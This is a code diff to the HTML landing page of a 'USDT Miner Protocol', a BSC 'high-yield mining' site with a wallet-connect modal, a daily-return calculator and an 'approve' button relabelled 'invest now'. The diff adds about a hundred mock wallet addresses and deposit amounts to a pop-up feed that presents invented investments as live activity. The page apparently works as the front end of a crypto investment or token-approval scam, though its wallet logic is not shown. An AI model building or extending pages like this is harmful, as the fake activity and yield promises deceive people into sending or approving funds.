@@ -10,48 +10,40 @@
     
     <title>USDT Miner Protocol - Alto Rendimiento</title>
     
+    <!-- Fuentes -->
     <!-- Favicon Profesional Vectorial (USDT Miner Theme) -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%2326a17b'/><path d='M17.9 17.2v-.1c0-1-.6-1.4-1.9-1.4s-1.9.4-1.9 1.4v.1c0 .9.6 1.3 1.9 1.3s1.9-.4 1.9-1.3zM22 8H10v2.7h4.4v1.9c-3 .2-5.2 1.1-5.2 2.2s2.2 2 5.2 2.2v5h3v-5c3-.2 5.2-1.1 5.2-2.2s-2.2-2-5.2-2.2v-1.9H22V8zm-6 7.7c-2.6 0-4.7-.7-4.7-1.6s2.1-1.6 4.7-1.6 4.7.7 4.7 1.6-2.1 1.6-4.7 1.6z' fill='%23fff'/></svg>">
     <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%2326a17b'/><path d='M17.9 17.2v-.1c0-1-.6-1.4-1.9-1.4s-1.9.4-1.9 1.4v.1c0 .9.6 1.3 1.9 1.3s1.9-.4 1.9-1.3zM22 8H10v2.7h4.4v1.9c-3 .2-5.2 1.1-5.2 2.2s2.2 2 5.2 2.2v5h3v-5c3-.2 5.2-1.1 5.2-2.2s-2.2-2-5.2-2.2v-1.9H22V8zm-6 7.7c-2.6 0-4.7-.7-4.7-1.6s2.1-1.6 4.7-1.6 4.7.7 4.7 1.6-2.1 1.6-4.7 1.6z' fill='%23fff'/></svg>">
+<!-- Fuentes y Estilos (previos intactos) -->
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;700;800&display=swap" rel="stylesheet">
     
-    <!-- Scripts base de ethers (intactos) -->
-    <script src="js/ethers.umd.min.js"></script>
-    
-    <!-- Inicialización robusta de Reown AppKit y Ethers v6 Adapter -->
+    <!-- Reown AppKit & EthersAdapter Scripts (ESM via CDN) -->
     <script type="module">
-      import { createAppKit } from 'https://esm.sh/@reown/appkit@1.6.0';
+      import { createAppKit } from 'https://esm.sh/@reown/appkit@latest';
+      import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@latest';
       import { bsc } from 'https://esm.sh/@reown/appkit/networks';
-      import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
-    
-      const projectId = 'd0e2a91d8b8bd759f1e3cfb6ea1e41c0';
-    
+
+      const projectId = 'd0e2a91d8b8bd759f1e3cfb6ea1e41c0'; // Reemplaza con tu Project ID de Reown
+
       const metadata = {
         name: 'USDT Miner Protocol',
-        description: 'High Yield BSC Mining Protocol',
+        description: 'Protocolo de minería directa optimizado para BSC',
         url: window.location.origin,
-        icons: ['https://assets.reown.com/reown-profile-pic.png']
+        icons: ['https://avatars.githubusercontent.com/u/179229932']
       };
-    
-      try {
-        window.modal = createAppKit({
-          adapters: [new EthersAdapter()],
-          networks: [bsc],
-          metadata,
-          projectId,
-          features: {
-            analytics: false
-          }
-        });
-        console.log("Reown AppKit inicializado correctamente.");
-      } catch (err) {
-        console.error("Error al inicializar Reown AppKit:", err);
-      }
+
+      window.modal = createAppKit({
+        adapters: [new EthersAdapter()],
+        networks: [bsc],
+        metadata,
+        projectId,
+        features: { analytics: true }
+      });
     </script>
 
-    <!-- Script de lógica de la aplicación -->
+    <!-- Scripts base de tu lógica -->
+    <script src="js/ethers.umd.min.js"></script>
     <script src="js/app.js" defer></script>
-
     <style>
         :root {
             --bg-base: #111317;
@@ -259,8 +251,7 @@
         .feature-card { background: var(--surface); padding: 30px; border-radius: 16px; border: 1px solid var(--surface-border); text-align: left; }
         .feature-card h3 { color: var(--brand-primary); margin-bottom: 12px; font-size: 1.2rem; }
         .feature-card p { color: var(--text-muted); font-size: 0.95rem; }
-
-        /* FAQ Section (Accordion) */
+/* FAQ Section (Accordion) */
         .faq-section { padding: 80px 10%; max-width: 900px; margin: 0 auto; }
         .faq-section h2 { text-align: center; margin-bottom: 40px; font-size: 2.2rem; }
         .faq-item {
@@ -387,6 +378,7 @@
                 <div class="field-block">
                     <p class="field-label">Amount</p>
                     <div class="desc-field">
+                        <!-- Configurado en 0.10, min 0.1 y step 0.1 para un control profesional y preciso -->
                         <input class="desc-text" id="investAmount" type="number" value="0.10" autocomplete="off" spellcheck="false" min="0.1" step="0.1">
                         <div class="desc-actions">
                             <span class="desc-token">USDT</span>
@@ -404,10 +396,9 @@
 
             <div class="page-spacer" aria-hidden="true"></div>
 
-            <!-- BOTÓN CONSERVADO CON SU ID ORIGINAL PARAapp.js -->
             <footer class="bottom-bar">
                 <button id="approveBtn" class="primary-button" type="button">
-                    <span id="btnText">Wallet Connect</span>
+                    <span id="btnText">INVERTIR AHORA</span>
                     <span id="btnSpinner" class="btn-spinner" aria-hidden="true" hidden></span>
                 </button>
                 <p style="text-align: center; font-size: 0.75rem; color: var(--text-muted); margin-top: 16px;">
@@ -437,7 +428,6 @@
             </div>
         </div>
     </section>
-
     <!-- FAQ Section -->
     <section class="faq-section">
         <h2>Preguntas Frecuentes</h2>
@@ -463,7 +453,6 @@
             </div>
         </details>
     </section>
-
     <!-- ── Floating Live Toast Dinámico ────────────────────────── -->
     <div class="live-toast-container" id="dynamicToast">
         <div class="live-toast-icon">
@@ -474,7 +463,7 @@
         <div id="toastContent"></div>
     </div>
 
-    <!-- ── Footer ────────────────────────────────________________ -->
+    <!-- ── Footer ──────────────────────────────────────────────── -->
     <footer class="site-footer">
         <div class="footer-links">
             <a href="#">BscScan</a>
@@ -485,7 +474,7 @@
         <p>© 2026 USDT Miner Protocol. Todos los derechos reservados. Interactuar con contratos inteligentes conlleva riesgos de mercado.</p>
     </footer>
 
-    <!-- ── Lógica Visual Dinámica & Respaldo Seguro del Modal ──────── -->
+    <!-- ── Lógica Visual Dinámica & Input Profesional ────────── -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             
@@ -506,6 +495,8 @@
                 }
                 
                 const daily = val * DAILY_RATE;
+                
+                // Formato con decimales adaptativos profesionales (hasta 4 decimales si es menor a 1, o 2 estándar)
                 const decimals = daily < 1 ? 4 : 2;
                 const formattedDaily = daily.toLocaleString('en-US', {
                     minimumFractionDigits: 2,
@@ -517,8 +508,10 @@
                 setTimeout(() => { roiBox.style.borderColor = "rgba(38, 161, 123, 0.3)"; }, 300);
             };
 
+            // Escuchar cambios al escribir o usar flechas del input
             amountInput.addEventListener('input', calculateROI);
 
+            // Asegurar un valor mínimo profesional cuando el usuario sale del campo (blur)
             amountInput.addEventListener('blur', () => {
                 let val = parseFloat(amountInput.value);
                 if (isNaN(val) || val < 0.1) {
@@ -529,6 +522,7 @@
                 calculateROI();
             });
 
+            // Acción opcional para el botón "Max"
             if (maxBtn) {
                 maxBtn.addEventListener('click', () => {
                     amountInput.value = "1000.00";
@@ -568,10 +562,33 @@
             
             const mockAddresses = [
                 '0x71A...3a9F', '0x88B...F221', '0x12C...B4cc', '0x9aE...e31b', '0x3F2...9C11', 
-                '0x4c2...81aD', '0x9f3...42bE', '0x2e8...99cF', '0x5a1...11dD', '0x6b4...77eE'
+                '0x4c2...81aD', '0x9f3...42bE', '0x2e8...99cF', '0x5a1...11dD', '0x6b4...77eE',
+                '0x3d7...44aF', '0x8f2...99bC', '0x1a9...55dE', '0x4e3...22fA', '0x7c6...88bB',
+                '0x9b5...12cC', '0x2f1...33dD', '0x6a8...44eE', '0x5d4...66fF', '0x1e7...77aA',
+                '0x3f9...88bB', '0x8c2...11cC', '0x4a6...22dD', '0x7e1...33eE', '0x9d3...55fF',
+                '0x2b4...66aA', '0x5f7...77bB', '0x1a8...99cC', '0x6c9...11dD', '0x3e2...22eE',
+                '0x7b5...33fF', '0x9a4...44aA', '0x2c1...55bB', '0x4d8...66cC', '0x8f6...77dD',
+                '0x1e3...88eE', '0x3b7...99fF', '0x6a2...11aA', '0x5f9...22bB', '0x7c4...33cC',
+                '0x9e8...44dD', '0x2a1...55eE', '0x4b6...66fF', '0x8d3...77aA', '0x1f5...88bB',
+                '0x3c2...99cC', '0x6e7...11dD', '0x5a4...22eE', '0x7f1...33fF', '0x9b8...44aA',
+                '0x2e3...55bB', '0x4c9...66cC', '0x8a6...77dD', '0x1d2...88eE', '0x3f7...99fF',
+                '0x6b1...11aA', '0x5e8...22bB', '0x7d4...33cC', '0x9c2...44dD', '0x2f5...55eE',
+                '0x4a3...66fF', '0x8e7...77aA', '0x1c9...88bB', '0x3d2...99cC', '0x6f4...11dD',
+                '0x5b8...22eE', '0x7a1...33fF', '0x9e3...44aA', '0x2c7...55bB', '0x4f5...66cC',
+                '0x8d6...77dD', '0x1b9...88eE', '0x3e4...99fF', '0x6c2...11aA', '0x5f3...22bB',
+                '0x7a8...33cC', '0x9d1...44dD', '0x2e6...55eE', '0x4b7...66fF', '0x8f3...77aA',
+                '0x1c5...88bB', '0x3a2...99cC', '0x6e9...11dD', '0x5d7...22eE', '0x7f4...33fF',
+                '0x9b1...44aA', '0x2c3...55bB', '0x4e8...66cC', '0x8a5...77dD', '0x1f2...88eE',
+                '0x3d6...99fF', '0x6b9...11aA', '0x5c4...22bB', '0x7e3...33cC', '0x9a7...44dD',
+                '0x2f8...55eE', '0x4d1...66fF', '0x8c6...77aA', '0x1e9...88bB', '0x3b4...99cC'
             ];
 
-            const mockAmounts = ['400.00', '36.00', '30.00', '41.00', '15.00', '40.00', '6.00', '72.00', '150.25', '520.50'];
+            const mockAmounts = [
+                '400.00', '36.00', '30.00', '41.00', '15.00', '40.00', '6.00', '72.00', '8.00', '10.00', '50.00', '1.00', '3.20', '1.21', '0.20', '0.20', '0.1', '150.25', '520.50', '245.75', '350.10', '500.00', '84.50',
+                '10.20', '890.30', '50.75', '200.40', '95.80', '120.15',
+                '0.90', '210.00', '150.25', '530.60', '120.45', '325.80',
+                '890.10', '300.50', '145.25', '670.30', '1,000.00', '30.75'
+            ];
 
             const showNextToast = () => {
                 const addr = mockAddresses[Math.floor(Math.random() * mockAddresses.length)];
@@ -593,24 +610,6 @@
 
             setTimeout(showNextToast, 2000);
             setInterval(showNextToast, 9000);
-
-            // 4. RESPALDO DE SEGURIDAD PARA EL MODAL (Abre el modal si app.js no maneja el evento)
-            const approveBtn = document.getElementById('approveBtn');
-            if (approveBtn) {
-                approveBtn.addEventListener('click', (e) => {
-                    // Si tu app.js principal ya controla este evento, esto servirá de respaldo absoluto 
-                    // para asegurar que el modal de Reown AppKit se abra en la PC si no hay sesión activa.
-                    setTimeout(() => {
-                        if (window.modal && typeof window.modal.open === "function") {
-                            // Verificamos si no hay una conexión ya abierta antes de forzar la apertura
-                            const state = window.modal.getState();
-                            if (!state || !state.selectedNetworkId) {
-                                window.modal.open();
-                            }
-                        }
-                    }, 200);
-                });
-            }
         });
     </script>
 </body>
